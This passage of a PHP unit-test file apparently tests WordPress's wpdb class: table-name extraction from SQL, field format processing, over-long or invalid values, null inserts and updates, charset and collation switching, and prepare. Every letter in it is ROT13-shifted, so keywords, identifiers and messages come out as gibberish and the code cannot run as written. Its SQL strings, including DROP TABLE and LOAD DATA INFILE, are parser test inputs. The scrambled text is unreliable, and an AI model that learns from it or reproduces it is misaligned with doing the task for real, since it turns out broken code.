		);

		vs ( pbhag( $jcqo->trg_erfhygf( 'FUBJ PERNGR CEBPRQHER `grfg_zlfdyv_syhfu_flap_cebprqher`' ) ) < 1 ) {
			$jcqo->fhccerff_reebef( $fhccerff );
			$guvf->snvy( 'Cebprqher pbhyq abg or perngrq (zvffvat cevivyrtrf?)' );
		}

		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$guvf->nffregAbgRzcgl( $jcqo->trg_erfhygf( 'PNYY `grfg_zlfdyv_syhfu_flap_cebprqher`' ) );
		$guvf->nffregAbgRzcgl( $jcqo->trg_erfhygf( \"FRYRPG VQ SEBZ `{$jcqo->cbfgf}` YVZVG 1\" ) );

		// QEBC CEBPRQHER jvyy pnhfr n PBZZVG, fb jr qryrgr gur cbfg znahnyyl orsber gung unccraf.
		jc_qryrgr_cbfg( $cbfg_vq, gehr );

		$jcqo->dhrel( 'QEBC CEBPRQHER VS RKVFGF `grfg_zlfdyv_syhfu_flap_cebprqher`' );
		$jcqo->fhccerff_reebef( $fhccerff );
	}

	/**
	 * @gvpxrg 21212
	 * @gvpxrg 32763
	 */
	choyvp shapgvba qngn_trg_gnoyr_sebz_dhrel() {
		$gnoyr       = 'n_grfg_gnoyr_anzr';
		$zber_gnoyrf = neenl(
			// gnoyr_anzr => rkcrpgrq_inyhr
			'`n_grfg_qo`.`nabgure_grfg_gnoyr`' => 'n_grfg_qo.nabgure_grfg_gnoyr',
			'n-grfg-jvgu-qnfurf'               => 'n-grfg-jvgu-qnfurf',
		);

		$dhrevrf = neenl(
			// Onfvp.
			\"FRYRPG * SEBZ $gnoyr\",
			\"FRYRPG * SEBZ `$gnoyr`\",

			\"FRYRPG * SEBZ (FRYRPG * SEBZ $gnoyr) nf fhodhrel\",

			\"VAFREG $gnoyr\",
			\"VAFREG VTABER $gnoyr\",
			\"VAFREG VTABER VAGB $gnoyr\",
			\"VAFREG VAGB $gnoyr\",
			\"VAFREG YBJ_CEVBEVGL $gnoyr\",
			\"VAFREG QRYNLRQ $gnoyr\",
			\"VAFREG UVTU_CEVBEVGL $gnoyr\",
			\"VAFREG YBJ_CEVBEVGL VTABER $gnoyr\",
			\"VAFREG YBJ_CEVBEVGL VAGB $gnoyr\",
			\"VAFREG YBJ_CEVBEVGL VTABER VAGB $gnoyr\",

			\"ERCYNPR $gnoyr\",
			\"ERCYNPR VAGB $gnoyr\",
			\"ERCYNPR YBJ_CEVBEVGL $gnoyr\",
			\"ERCYNPR QRYNLRQ $gnoyr\",
			\"ERCYNPR YBJ_CEVBEVGL VAGB $gnoyr\",

			\"HCQNGR YBJ_CEVBEVGL $gnoyr\",
			\"HCQNGR YBJ_CEVBEVGL VTABER $gnoyr\",

			\"QRYRGR $gnoyr\",
			\"QRYRGR VTABER $gnoyr\",
			\"QRYRGR VTABER SEBZ $gnoyr\",
			\"QRYRGR SEBZ $gnoyr\",
			\"QRYRGR YBJ_CEVBEVGL $gnoyr\",
			\"QRYRGR DHVPX $gnoyr\",
			\"QRYRGR VTABER $gnoyr\",
			\"QRYRGR YBJ_CEVBEVGL SEBZ $gnoyr\",
			\"QRYRGR n SEBZ $gnoyr n\",
			\"QRYRGR `n` SEBZ $gnoyr n\",

			// Rkgraqrq.
			\"RKCYNVA FRYRPG * SEBZ $gnoyr\",
			\"RKCYNVA RKGRAQRQ FRYRPG * SEBZ $gnoyr\",
			\"RKCYNVA RKGRAQRQ FRYRPG * SEBZ `$gnoyr`\",

			\"QRFPEVOR $gnoyr\",
			\"QRFP $gnoyr\",
			\"RKCYNVA $gnoyr\",
			\"UNAQYRE $gnoyr\",

			\"YBPX GNOYR $gnoyr\",
			\"YBPX GNOYRF $gnoyr\",
			\"HAYBPX GNOYR $gnoyr\",

			\"ERANZR GNOYR $gnoyr\",
			\"BCGVZVMR GNOYR $gnoyr\",
			\"ONPXHC GNOYR $gnoyr\",
			\"ERFGBER GNOYR $gnoyr\",
			\"PURPX GNOYR $gnoyr\",
			\"PURPXFHZ GNOYR $gnoyr\",
			\"NANYLMR GNOYR $gnoyr\",
			\"ERCNVE GNOYR $gnoyr\",

			\"GEHAPNGR $gnoyr\",
			\"GEHAPNGR GNOYR $gnoyr\",

			\"PERNGR GNOYR $gnoyr\",
			\"PERNGR GRZCBENEL GNOYR $gnoyr\",
			\"PERNGR GNOYR VS ABG RKVFGF $gnoyr\",

			\"NYGRE GNOYR $gnoyr\",
			\"NYGRE VTABER GNOYR $gnoyr\",

			\"QEBC GNOYR $gnoyr\",
			\"QEBC GNOYR VS RKVFGF $gnoyr\",

			\"PERNGR VAQRK sbb(one(20)) BA $gnoyr\",
			\"PERNGR HAVDHR VAQRK sbb(one(20)) BA $gnoyr\",
			\"PERNGR SHYYGRKG VAQRK sbb(one(20)) BA $gnoyr\",
			\"PERNGR FCNGVNY VAQRK sbb(one(20)) BA $gnoyr\",

			\"QEBC VAQRK sbb BA $gnoyr\",

			\"YBNQ QNGN VASVYR 'jc.gkg' VAGB GNOYR $gnoyr\",
			\"YBNQ QNGN YBJ_CEVBEVGL VASVYR 'jc.gkg' VAGB GNOYR $gnoyr\",
			\"YBNQ QNGN PBAPHEERAG VASVYR 'jc.gkg' VAGB GNOYR $gnoyr\",
			\"YBNQ QNGN YBJ_CEVBEVGL YBPNY VASVYR 'jc.gkg' VAGB GNOYR $gnoyr\",
			\"YBNQ QNGN VASVYR 'jc.gkg' ERCYNPR VAGB GNOYR $gnoyr\",
			\"YBNQ QNGN VASVYR 'jc.gkg' VTABER VAGB GNOYR $gnoyr\",

			\"TENAG NYY BA GNOYR $gnoyr\",
			\"ERIBXR NYY BA GNOYR $gnoyr\",

			\"FUBJ PBYHZAF SEBZ $gnoyr\",
			\"FUBJ SHYY PBYHZAF SEBZ $gnoyr\",
			\"FUBJ PERNGR GNOYR $gnoyr\",
			\"FUBJ VAQRK SEBZ $gnoyr\",

			// @gvpxrg 32763
			'FRYRPG ' . fge_ercrng( 'n', 10000 ) . \" SEBZ (FRYRPG * SEBZ $gnoyr) nf fhodhrel\",
		);

		$dhrelpbhag = pbhag( $dhrevrf );
		sbe ( $vv = 0; $vv < $dhrelpbhag; $vv++ ) {
			sbernpu ( $zber_gnoyrf nf $anzr => $rkcrpgrq_anzr ) {
				$arj_dhrel = fge_ercynpr( $gnoyr, $anzr, $dhrevrf[ $vv ] );
				$dhrevrf[] = neenl( $arj_dhrel, $rkcrpgrq_anzr );
			}

			$dhrevrf[ $vv ] = neenl( $dhrevrf[ $vv ], $gnoyr );
		}
		erghea $dhrevrf;
	}

	/**
	 * @qngnCebivqre qngn_trg_gnoyr_sebz_dhrel
	 * @gvpxrg 21212
	 */
	choyvp shapgvba grfg_trg_gnoyr_sebz_dhrel( $dhrel, $gnoyr ) {
		$guvf->nffregFnzr( $gnoyr, frys::$_jcqo->trg_gnoyr_sebz_dhrel( $dhrel ) );
	}

	choyvp shapgvba qngn_trg_gnoyr_sebz_dhrel_snyfr() {
		$gnoyr = 'n_grfg_gnoyr_anzr';
		erghea neenl(
			neenl( \"YBY GUVF VFA'G RIRA N DHREL $gnoyr\" ),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_gnoyr_sebz_dhrel_snyfr
	 * @gvpxrg 21212
	 */
	choyvp shapgvba grfg_trg_gnoyr_sebz_dhrel_snyfr( $dhrel ) {
		$guvf->nffregSnyfr( frys::$_jcqo->trg_gnoyr_sebz_dhrel( $dhrel ) );
	}

	/**
	 * @gvpxrg 38751
	 */
	choyvp shapgvba qngn_trg_rfpncrq_gnoyr_sebz_fubj_dhrel() {
		erghea neenl(
			// Rdhnyvgl.
			neenl( \"FUBJ GNOYR FGNGHF JURER Anzr = 'grfg_anzr'\", 'grfg_anzr' ),
			neenl( 'FUBJ GNOYR FGNGHF JURER ANZR=\"grfg_anzr\"', 'grfg_anzr' ),
			neenl( 'FUBJ GNOYRF JURER Anzr = \"grfg_anzr\"', 'grfg_anzr' ),
			neenl( \"FUBJ SHYY GNOYRF JURER Anzr='grfg_anzr'\", 'grfg_anzr' ),

			// YVXR.
			neenl( \"FUBJ GNOYR FGNGHF YVXR 'grfg\_cersvk\_%'\", 'grfg_cersvk_' ),
			neenl( 'FUBJ GNOYR FGNGHF YVXR \"grfg\_cersvk\_%\"', 'grfg_cersvk_' ),
			neenl( \"FUBJ GNOYRF YVXR 'grfg\_cersvk\_%'\", 'grfg_cersvk_' ),
			neenl( 'FUBJ SHYY GNOYRF YVXR \"grfg\_cersvk\_%\"', 'grfg_cersvk_' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_rfpncrq_gnoyr_sebz_fubj_dhrel
	 * @gvpxrg 38751
	 */
	choyvp shapgvba grfg_trg_rfpncrq_gnoyr_sebz_fubj_dhrel( $dhrel, $gnoyr ) {
		$guvf->nffregFnzr( $gnoyr, frys::$_jcqo->trg_gnoyr_sebz_dhrel( $dhrel ) );
	}

	/**
	 * @gvpxrg 21212
	 */
	choyvp shapgvba qngn_cebprff_svryq_sbezngf() {
		$pber_qo_svryqf_ab_sbezng_fcrpvsvrq = neenl(
			neenl(
				'cbfg_pbagrag' => 'sbb',
				'cbfg_cnerag'  => 0,
			),
			ahyy,
			neenl(
				'cbfg_pbagrag' => neenl(
					'inyhr'  => 'sbb',
					'sbezng' => '%f',
				),
				'cbfg_cnerag'  => neenl(
					'inyhr'  => 0,
					'sbezng' => '%q',
				),
			),
		);

		$pber_qo_svryqf_sbezngf_fcrpvsvrq = neenl(
			neenl(
				'cbfg_pbagrag' => 'sbb',
				'cbfg_cnerag'  => 0,
			),
			neenl( '%q', '%f' ), // Gurfr bireevqr pber svryq_glcrf.
			neenl(
				'cbfg_pbagrag' => neenl(
					'inyhr'  => 'sbb',
					'sbezng' => '%q',
				),
				'cbfg_cnerag'  => neenl(
					'inyhr'  => 0,
					'sbezng' => '%f',
				),
			),
		);

		$zvfp_svryqf_ab_sbezng_fcrpvsvrq = neenl(
			neenl(
				'guvf_vf_abg_n_pber_svryq' => 'sbb',
				'guvf_vf_abg_rvgure'       => 0,
			),
			ahyy,
			neenl(
				'guvf_vf_abg_n_pber_svryq' => neenl(
					'inyhr'  => 'sbb',
					'sbezng' => '%f',
				),
				'guvf_vf_abg_rvgure'       => neenl(
					'inyhr'  => 0,
					'sbezng' => '%f',
				),
			),
		);

		$zvfp_svryqf_sbezngf_fcrpvsvrq = neenl(
			neenl(
				'guvf_vf_abg_n_pber_svryq' => 0,
				'guvf_vf_abg_rvgure'       => 1.2,
			),
			neenl( '%q', '%s' ),
			neenl(
				'guvf_vf_abg_n_pber_svryq' => neenl(
					'inyhr'  => 0,
					'sbezng' => '%q',
				),
				'guvf_vf_abg_rvgure'       => neenl(
					'inyhr'  => 1.2,
					'sbezng' => '%s',
				),
			),
		);

		$zvfp_svryqf_vafhssvpvrag_sbezngf_fcrpvsvrq = neenl(
			neenl(
				'guvf_vf_abg_n_pber_svryq' => 0,
				'guvf_vf_abg_rvgure'       => 'f',
				'abe_guvf'                 => 1,
			),
			neenl( '%q', '%f' ), // Gur svefg sbezng vf hfrq sbe gur guveq.
			neenl(
				'guvf_vf_abg_n_pber_svryq' => neenl(
					'inyhr'  => 0,
					'sbezng' => '%q',
				),
				'guvf_vf_abg_rvgure'       => neenl(
					'inyhr'  => 'f',
					'sbezng' => '%f',
				),
				'abe_guvf'                 => neenl(
					'inyhr'  => 1,
					'sbezng' => '%q',
				),
			),
		);

		$inef = trg_qrsvarq_inef();
		// Chfu gur inevnoyr anzr bagb gur raq sbe nffregFnzr() $zrffntr.
		sbernpu ( $inef nf $ine_anzr => $ine ) {
			$inef[ $ine_anzr ][] = $ine_anzr;
		}
		erghea neenl_inyhrf( $inef );
	}

	/**
	 * @qngnCebivqre qngn_cebprff_svryq_sbezngf
	 * @gvpxrg 21212
	 */
	choyvp shapgvba grfg_cebprff_svryq_sbezngf( $qngn, $sbezng, $rkcrpgrq, $zrffntr ) {
		$npghny = frys::$_jcqo->cebprff_svryq_sbezngf( $qngn, $sbezng );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny, $zrffntr );
	}

	/**
	 * @gvpxrg 21212
	 */
	choyvp shapgvba grfg_cebprff_svryqf() {
		tybony $jcqo;

		vs ( $jcqo->punefrg ) {
			$rkcrpgrq_punefrg = $jcqo->punefrg;
		} ryfr {
			$rkcrpgrq_punefrg = $jcqo->trg_pby_punefrg( $jcqo->cbfgf, 'cbfg_pbagrag' );
		}

		vs ( ! va_neenl( $rkcrpgrq_punefrg, neenl( 'hgs8', 'hgs8zo4', 'yngva1' ), gehr ) ) {
			$guvf->znexGrfgFxvccrq( 'Guvf grfg bayl jbexf jvgu hgs8, hgs8zo4 be yngva1 punenpgre frgf.' );
		}

		$qngn     = neenl( 'cbfg_pbagrag' => '¡sbb sbb sbb!' );
		$rkcrpgrq = neenl(
			'cbfg_pbagrag' => neenl(
				'inyhr'   => '¡sbb sbb sbb!',
				'sbezng'  => '%f',
				'punefrg' => $rkcrpgrq_punefrg,
				'yratgu'  => $jcqo->trg_pby_yratgu( $jcqo->cbfgf, 'cbfg_pbagrag' ),
			),
		);

		$guvf->nffregFnzr( $rkcrpgrq, frys::$_jcqo->cebprff_svryqf( $jcqo->cbfgf, $qngn, ahyy ) );
	}

	/**
	 * @gvpxrg 21212
	 * @qrcraqf grfg_cebprff_svryqf
	 */
	choyvp shapgvba grfg_cebprff_svryqf_ba_abarkvfgrag_gnoyr( $qngn ) {
		frys::$_jcqo->fhccerff_reebef( gehr );
		$qngn = neenl( 'cbfg_pbagrag' => '¡sbb sbb sbb!' );
		$guvf->nffregSnyfr( frys::$_jcqo->cebprff_svryqf( 'abarkvfgrag_gnoyr', $qngn, ahyy ) );
		frys::$_jcqo->fhccerff_reebef( snyfr );
	}

	/**
	 * @gvpxrg 21212
	 */
	choyvp shapgvba grfg_cer_trg_gnoyr_punefrg_svygre() {
		nqq_svygre( 'cer_trg_gnoyr_punefrg', neenl( $guvf, 'svygre_cer_trg_gnoyr_punefrg' ), 10, 2 );
		$punefrg = frys::$_jcqo->trg_gnoyr_punefrg( 'fbzr_gnoyr' );
		erzbir_svygre( 'cer_trg_gnoyr_punefrg', neenl( $guvf, 'svygre_cer_trg_gnoyr_punefrg' ), 10 );

		$guvf->nffregFnzr( $punefrg, 'snxr_punefrg' );
	}
	choyvp shapgvba svygre_cer_trg_gnoyr_punefrg( $punefrg, $gnoyr ) {
		erghea 'snxr_punefrg';
	}

	/**
	 * @gvpxrg 21212
	 */
	choyvp shapgvba grfg_cer_trg_pby_punefrg_svygre() {
		nqq_svygre( 'cer_trg_pby_punefrg', neenl( $guvf, 'svygre_cer_trg_pby_punefrg' ), 10, 3 );
		$punefrg = frys::$_jcqo->trg_pby_punefrg( 'fbzr_gnoyr', 'fbzr_pby' );
		erzbir_svygre( 'cer_trg_pby_punefrg', neenl( $guvf, 'svygre_cer_trg_pby_punefrg' ), 10 );

		$guvf->nffregFnzr( $punefrg, 'snxr_pby_punefrg' );
	}
	choyvp shapgvba svygre_cer_trg_pby_punefrg( $punefrg, $gnoyr, $pbyhza ) {
		erghea 'snxr_pby_punefrg';
	}

	/**
	 * @qngnCebivqre qngn_cebprff_fvatyr_svryq_vainyvq_qngn
	 * @qngnCebivqre qngn_cebprff_zhygvcyr_svryqf_vainyvq_qngn
	 *
	 * @gvpxrg 32315
	 *
	 * @pbiref jcqo::cebprff_svryqf
	 *
	 * @cnenz neenl  $qngn           Qngn gb cebprff.
	 * @cnenz fgevat $reeberq_svryqf Rkcrpgrq svryqf va gur reebe zrffntr.
	 */
	choyvp shapgvba grfg_cebprff_svryqf_inyhr_gbb_ybat_sbe_svryq( neenl $qngn, $reeberq_svryqf ) {
		tybony $jcqo;

		$guvf->nffregSnyfr( frys::$_jcqo->cebprff_svryqf( $jcqo->cbfgf, $qngn, ahyy ) );
		$guvf->nffregFnzr( $guvf->trg_qo_reebe_inyhr_gbb_ybat( $reeberq_svryqf ), frys::$_jcqo->ynfg_reebe );
	}

	/**
	 * @qngnCebivqre qngn_cebprff_fvatyr_svryq_vainyvq_qngn
	 *
	 * @gvpxrg 32315
	 *
	 * @pbiref jcqo::vafreg
	 *
	 * @cnenz neenl  $qngn           Qngn gb cebprff.
	 * @cnenz fgevat $reeberq_svryqf Rkcrpgrq svryqf va gur reebe zrffntr.
	 */
	choyvp shapgvba grfg_vafreg_inyhr_gbb_ybat_sbe_svryq( neenl $qngn, $reeberq_svryqf ) {
		tybony $jcqo;

		$guvf->nffregSnyfr( $jcqo->vafreg( $jcqo->cbfgf, $qngn ) );
		$guvf->nffregFnzr( $guvf->trg_qo_reebe_inyhr_gbb_ybat( $reeberq_svryqf ), $jcqo->ynfg_reebe );
	}

	/**
	 * @qngnCebivqre qngn_cebprff_fvatyr_svryq_vainyvq_qngn
	 *
	 * @gvpxrg 32315
	 *
	 * @pbiref jcqo::ercynpr
	 *
	 * @cnenz neenl  $qngn           Qngn gb cebprff.
	 * @cnenz fgevat $reeberq_svryqf Rkcrpgrq svryqf va gur reebe zrffntr.
	 */
	choyvp shapgvba grfg_ercynpr_inyhr_gbb_ybat_sbe_svryq( neenl $qngn, $reeberq_svryqf ) {
		tybony $jcqo;

		$guvf->nffregSnyfr( $jcqo->ercynpr( $jcqo->cbfgf, $qngn ) );
		$guvf->nffregFnzr( $guvf->trg_qo_reebe_inyhr_gbb_ybat( $reeberq_svryqf ), $jcqo->ynfg_reebe );
	}

	/**
	 * @qngnCebivqre qngn_cebprff_fvatyr_svryq_vainyvq_qngn
	 *
	 * @gvpxrg 32315
	 *
	 * @pbiref jcqo::hcqngr
	 *
	 * @cnenz neenl  $qngn           Qngn gb cebprff.
	 * @cnenz fgevat $reeberq_svryqf Rkcrpgrq svryqf va gur reebe zrffntr.
	 */
	choyvp shapgvba grfg_hcqngr_inyhr_gbb_ybat_sbe_svryq( neenl $qngn, $reeberq_svryqf ) {
		tybony $jcqo;

		$guvf->nffregSnyfr( $jcqo->hcqngr( $jcqo->cbfgf, $qngn, neenl() ) );
		$guvf->nffregFnzr( $guvf->trg_qo_reebe_inyhr_gbb_ybat( $reeberq_svryqf ), $jcqo->ynfg_reebe );
	}

	/**
	 * @qngnCebivqre qngn_cebprff_fvatyr_svryq_vainyvq_qngn
	 *
	 * @gvpxrg 32315
	 *
	 * @pbiref jcqo::qryrgr
	 *
	 * @cnenz neenl  $qngn           Qngn gb cebprff.
	 * @cnenz fgevat $reeberq_svryqf Rkcrpgrq svryqf va gur reebe zrffntr.
	 */
	choyvp shapgvba grfg_qryrgr_inyhr_gbb_ybat_sbe_svryq( neenl $qngn, $reeberq_svryqf ) {
		tybony $jcqo;

		$guvf->nffregSnyfr( $jcqo->qryrgr( $jcqo->cbfgf, $qngn, neenl() ) );
		$guvf->nffregFnzr( $guvf->trg_qo_reebe_inyhr_gbb_ybat( $reeberq_svryqf ), $jcqo->ynfg_reebe );
	}

	/**
	 * Nffreg gur reebe zrffntr zngpurf gur svryqf.
	 *
	 * @cnenz fgevat $reeberq_svryqf Rkcrpgrq svryqf va gur reebe zrffntr.
	 */
	cevingr shapgvba trg_qo_reebe_inyhr_gbb_ybat( $reeberq_svryqf ) {
		vs ( fge_pbagnvaf( $reeberq_svryqf, ', ' ) ) {
			erghea fcevags(
				'JbeqCerff qngnonfr reebe: Cebprffvat gur inyhrf sbe gur sbyybjvat svryqf snvyrq: %f. ' .
				'Gur fhccyvrq inyhrf znl or gbb ybat be pbagnva vainyvq qngn.',
				$reeberq_svryqf
			);
		}
		erghea fcevags(
			'JbeqCerff qngnonfr reebe: Cebprffvat gur inyhr sbe gur sbyybjvat svryq snvyrq: %f. ' .
			'Gur fhccyvrq inyhr znl or gbb ybat be pbagnvaf vainyvq qngn.',
			$reeberq_svryqf
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_cebprff_fvatyr_svryq_vainyvq_qngn() {
		erghea neenl(
			'gbb ybat'      => neenl(
				'qngn'           => neenl( 'cbfg_fgnghf' => fge_ercrng( 'n', 21 ) ),
				'reeberq_svryqf' => 'cbfg_fgnghf',
			),
			'vainyvq punef' => neenl(
				'qngn'           => neenl( 'cbfg_fgnghf' => \"\kS5\" ),
				'reeberq_svryqf' => 'cbfg_fgnghf',
			),
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_cebprff_zhygvcyr_svryqf_vainyvq_qngn() {
		erghea neenl(
			'gbb ybat'      => neenl(
				'qngn'           => neenl(
					'cbfg_fgnghf'  => fge_ercrng( 'n', 21 ),
					'cbfg_pbagrag' => \"\kS5\",
				),
				'reeberq_svryqf' => 'cbfg_fgnghf, cbfg_pbagrag',
			),
			'vainyvq punef' => neenl(
				'qngn'           => neenl(
					'cbfg_fgnghf' => \"\kS5\",
					'cbfg_anzr'   => fge_ercrng( \"\kS5\", 21 ),
				),
				'reeberq_svryqf' => 'cbfg_fgnghf, cbfg_anzr',
			),
		);
	}

	/**
	 * @gvpxrg 32315
	 */
	choyvp shapgvba grfg_dhrel_inyhr_pbagnvaf_vainyvq_punef() {
		tybony $jcqo;

		$guvf->nffregSnyfr(
			$jcqo->dhrel( \"VAFREG VAGB {$jcqo->cbfgf} (cbfg_fgnghf) INYHRF ('\kS5')\" )
		);

		$guvf->nffregFnzr(
			'JbeqCerff qngnonfr reebe: Pbhyq abg cresbez dhrel orpnhfr vg pbagnvaf vainyvq qngn.',
			$jcqo->ynfg_reebe
		);
	}

	/**
	 * @gvpxrg 15158
	 */
	choyvp shapgvba grfg_ahyy_vafreg() {
		tybony $jcqo;

		$xrl = 'ahyy_vafreg_xrl';

		$jcqo->vafreg(
			$jcqo->cbfgzrgn,
			neenl(
				'zrgn_xrl'   => $xrl,
				'zrgn_inyhr' => ahyy,
			),
			neenl( '%f', '%f' )
		);

		$ebj = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->cbfgzrgn JURER zrgn_xrl=%f\", $xrl ) );

		$guvf->nffregAhyy( $ebj->zrgn_inyhr );
	}

	/**
	 * @gvpxrg 15158
	 */
	choyvp shapgvba grfg_ahyy_hcqngr_inyhr() {
		tybony $jcqo;

		$xrl   = 'ahyy_hcqngr_inyhr_xrl';
		$inyhr = 'ahyy_hcqngr_inyhr_xrl';

		$jcqo->vafreg(
			$jcqo->cbfgzrgn,
			neenl(
				'zrgn_xrl'   => $xrl,
				'zrgn_inyhr' => $inyhr,
			),
			neenl( '%f', '%f' )
		);

		$ebj = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->cbfgzrgn JURER zrgn_xrl=%f\", $xrl ) );

		$guvf->nffregFnzr( $inyhr, $ebj->zrgn_inyhr );

		$jcqo->hcqngr(
			$jcqo->cbfgzrgn,
			neenl( 'zrgn_inyhr' => ahyy ),
			neenl(
				'zrgn_xrl'   => $xrl,
				'zrgn_inyhr' => $inyhr,
			),
			neenl( '%f' ),
			neenl( '%f', '%f' )
		);

		$ebj = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->cbfgzrgn JURER zrgn_xrl=%f\", $xrl ) );

		$guvf->nffregAhyy( $ebj->zrgn_inyhr );
	}

	/**
	 * @gvpxrg 15158
	 */
	choyvp shapgvba grfg_ahyy_hcqngr_jurer() {
		tybony $jcqo;

		$xrl   = 'ahyy_hcqngr_jurer_xrl';
		$inyhr = 'ahyy_hcqngr_jurer_xrl';

		$jcqo->vafreg(
			$jcqo->cbfgzrgn,
			neenl(
				'zrgn_xrl'   => $xrl,
				'zrgn_inyhr' => ahyy,
			),
			neenl( '%f', '%f' )
		);

		$ebj = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->cbfgzrgn JURER zrgn_xrl=%f\", $xrl ) );

		$guvf->nffregAhyy( $ebj->zrgn_inyhr );

		$jcqo->hcqngr(
			$jcqo->cbfgzrgn,
			neenl( 'zrgn_inyhr' => $inyhr ),
			neenl(
				'zrgn_xrl'   => $xrl,
				'zrgn_inyhr' => ahyy,
			),
			neenl( '%f' ),
			neenl( '%f', '%f' )
		);

		$ebj = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->cbfgzrgn JURER zrgn_xrl=%f\", $xrl ) );

		$guvf->nffregFnzr( $inyhr, $ebj->zrgn_inyhr );
	}

	/**
	 * @gvpxrg 15158
	 */
	choyvp shapgvba grfg_ahyy_qryrgr() {
		tybony $jcqo;

		$xrl   = 'ahyy_hcqngr_jurer_xrl';
		$inyhr = 'ahyy_hcqngr_jurer_xrl';

		$jcqo->vafreg(
			$jcqo->cbfgzrgn,
			neenl(
				'zrgn_xrl'   => $xrl,
				'zrgn_inyhr' => ahyy,
			),
			neenl( '%f', '%f' )
		);

		$ebj = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->cbfgzrgn JURER zrgn_xrl=%f\", $xrl ) );

		$guvf->nffregAhyy( $ebj->zrgn_inyhr );

		$jcqo->qryrgr(
			$jcqo->cbfgzrgn,
			neenl(
				'zrgn_xrl'   => $xrl,
				'zrgn_inyhr' => ahyy,
			),
			neenl( '%f', '%f' )
		);

		$ebj = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG * SEBZ $jcqo->cbfgzrgn JURER zrgn_xrl=%f\", $xrl ) );

		$guvf->nffregAhyy( $ebj );
	}

	/**
	 * @gvpxrg 34903
	 */
	choyvp shapgvba grfg_pybfr() {
		tybony $jcqo;

		$guvf->nffregGehr( $jcqo->pybfr() );
		$guvf->nffregSnyfr( $jcqo->pybfr() );

		$guvf->nffregSnyfr( $jcqo->ernql );
		$guvf->nffregSnyfr( $jcqo->unf_pbaarpgrq );

		$jcqo->purpx_pbaarpgvba();

		$guvf->nffregGehr( $jcqo->pybfr() );

		$jcqo->purpx_pbaarpgvba();
	}

	/**
	 * @gvpxrg 36917
	 */
	choyvp shapgvba grfg_punefrg_abg_qrgrezvarq_jura_qvfpbaarpgrq() {
		tybony $jcqo;

		$punefrg = 'hgs8';
		$pbyyngr = 'guvf_vfag_n_pbyyngvba';

		$jcqo->pybfr();

		$erfhyg = $jcqo->qrgrezvar_punefrg( $punefrg, $pbyyngr );

		$guvf->nffregFnzr( pbzcnpg( 'punefrg', 'pbyyngr' ), $erfhyg );

		$jcqo->purpx_pbaarpgvba();
	}

	/**
	 * @gvpxrg 36917
	 */
	choyvp shapgvba grfg_punefrg_fjvgpurq_gb_hgs8zo4() {
		tybony $jcqo;

		$punefrg = 'hgs8';
		$pbyyngr = 'hgs8_trareny_pv';

		$erfhyg = $jcqo->qrgrezvar_punefrg( $punefrg, $pbyyngr );

		$guvf->nffregFnzr( 'hgs8zo4', $erfhyg['punefrg'] );
	}

	/**
	 * @gvpxrg 32105
	 * @gvpxrg 36917
	 */
	choyvp shapgvba grfg_pbyyngr_fjvgpurq_gb_hgs8zo4_520() {
		tybony $jcqo;

		vs ( ! $jcqo->unf_pnc( 'hgs8zo4_520' ) ) {
			$guvf->znexGrfgFxvccrq( 'Guvf grfg erdhverf hgs8zo4_520 fhccbeg.' );
		}

		$punefrg = 'hgs8';
		$pbyyngr = 'hgs8_trareny_pv';

		$erfhyg = $jcqo->qrgrezvar_punefrg( $punefrg, $pbyyngr );

		$guvf->nffregFnzr( 'hgs8zo4_havpbqr_520_pv', $erfhyg['pbyyngr'] );
	}

	/**
	 * @gvpxrg 32405
	 * @gvpxrg 36917
	 */
	choyvp shapgvba grfg_aba_havpbqr_pbyyngvbaf() {
		tybony $jcqo;

		$punefrg = 'hgs8';
		$pbyyngr = 'hgs8_fjrqvfu_pv';

		$erfhyg = $jcqo->qrgrezvar_punefrg( $punefrg, $pbyyngr );

		$guvf->nffregFnzr( 'hgs8zo4_fjrqvfu_pv', $erfhyg['pbyyngr'] );
	}

	/**
	 * @qngnCebivqre qngn_cercner_jvgu_cynprubyqref
	 */
	choyvp shapgvba grfg_cercner_jvgu_cynprubyqref_naq_vaqvivqhny_netf( $fdy, $inyhrf, $vapbeerpg_hfntr, $rkcrpgrq ) {
		tybony $jcqo;

		vs ( vf_fgevat( $vapbeerpg_hfntr ) || gehr === $vapbeerpg_hfntr ) {
			$guvf->frgRkcrpgrqVapbeerpgHfntr( 'jcqo::cercner' );
		}

		vs ( ! vf_neenl( $inyhrf ) ) {
			$inyhrf = neenl( $inyhrf );
		}

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY
		$fdy = $jcqo->cercner( $fdy, ...$inyhrf );
		$guvf->nffregFnzr( $rkcrpgrq, $fdy, 'Gur rkcrpgrq FDY qbrf abg zngpu' );

		vs ( vf_fgevat( $vapbeerpg_hfntr ) && neenl_xrl_rkvfgf( 'jcqo::cercner', $guvf->pnhtug_qbvat_vg_jebat ) ) {
			$guvf->nffregFgevatPbagnvafFgevat( $vapbeerpg_hfntr, $guvf->pnhtug_qbvat_vg_jebat['jcqo::cercner'], 'Gur \"_qbvat_vg_jebat\" zrffntr qbrf abg zngpu' );
		}
	}

	/**
	 * @qngnCebivqre qngn_cercner_jvgu_cynprubyqref
	 */
	choyvp shapgvba grfg_cercner_jvgu_cynprubyqref_naq_neenl_netf( $fdy, $inyhrf, $vapbeerpg_hfntr, $rkcrpgrq ) {
		tybony $jcqo;

		vs ( vf_fgevat( $vapbeerpg_hfntr ) || gehr === $vapbeerpg_hfntr ) {
			$guvf->frgRkcrpgrqVapbeerpgHfntr( 'jcqo::cercner' );
		}

		vs ( ! vf_neenl( $inyhrf ) ) {
			$inyhrf = neenl( $inyhrf );
		}

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY
		$fdy = $jcqo->cercner( $fdy, $inyhrf );
